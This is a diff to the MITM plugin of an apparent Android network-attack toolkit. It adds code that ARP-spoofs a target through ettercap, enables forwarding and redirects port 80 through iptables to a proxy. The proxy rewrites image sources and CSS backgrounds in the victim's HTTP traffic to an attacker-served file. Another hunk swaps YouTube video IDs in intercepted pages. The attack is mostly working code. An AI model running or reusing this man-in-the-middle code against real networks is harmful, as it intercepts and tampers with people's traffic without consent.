@@ -192,7 +192,43 @@ public class MITM extends Plugin
 		    		System.getServer().setResource( fileName, mimeType );
 		    		new Thread( System.getServer() ).start();
 		    		
-		    		HTTPFilter.start( System.getProxy(), "src=['\"][^'\"]+\\.(jpg|jpeg|png|gif)['\"]", "src=\"" + System.getServer().getResourceURL() + "\"" );
+		    		final Proxy proxy = System.getProxy();
+		    		
+		    		System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
+		    			@Override
+		    			public void onReady() 
+		    			{
+		    				System.setForwarding( true );
+		    				
+		    				proxy.setFilter( new Proxy.ProxyFilter(){
+								@Override
+								public String onDataReceived( String headers, String data ) {
+									String resource = System.getServer().getResourceURL();
+									
+									// handle img tags
+									data = data.replaceAll
+									( 
+									  "(?i)<img([^/]+)src=['\"][^'\"]+['\"]", 
+									  "<img$1src=\"" + resource + "\"" 
+									);
+																
+									// handle css background declarations
+									data = data.replaceAll
+									( 
+									  "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*", 
+									  "background: url(" + resource + ")" 
+									);
+		
+									return data;
+								}
+							});
+		    				
+		    				new Thread( proxy ).start();
+		    				
+		    				System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );									
+		    			}
+		    			
+		    		}).start();					    		
 		    	}		    	
 	    	}
 	    	catch( Exception e )
@@ -406,17 +442,17 @@ public class MITM extends Plugin
 										
 										proxy.setFilter( new Proxy.ProxyFilter() {					
 											@Override
-											public String onHtmlReceived(String html) {												
-												if( html.matches( "(?s).+/v=[a-zA-Z0-9_-]+.+" ) )
-													html = html.replaceAll( "(?s)/v=[a-zA-Z0-9_-]+", "/v=" + videoId );
+											public String onDataReceived( String headers, String data ) {												
+												if( data.matches( "(?s).+/v=[a-zA-Z0-9_-]+.+" ) )
+													data = data.replaceAll( "(?s)/v=[a-zA-Z0-9_-]+", "/v=" + videoId );
 												
-												else if( html.matches( "(?s).+/v/[a-zA-Z0-9_-]+.+" ) )
-													html = html.replaceAll( "(?s)/v/[a-zA-Z0-9_-]+", "/v/" + videoId );
+												else if( data.matches( "(?s).+/v/[a-zA-Z0-9_-]+.+" ) )
+													data = data.replaceAll( "(?s)/v/[a-zA-Z0-9_-]+", "/v/" + videoId );
 												
-												else if( html.matches( "(?s).+/embed/[a-zA-Z0-9_-]+.+" ) )
-													html = html.replaceAll( "(?s)/embed/[a-zA-Z0-9_-]+", "/embed/" + videoId );										
+												else if( data.matches( "(?s).+/embed/[a-zA-Z0-9_-]+.+" ) )
+													data = data.replaceAll( "(?s)/embed/[a-zA-Z0-9_-]+", "/embed/" + videoId );										
 												
-												return html;
+												return data;
 											}
 										});
 										
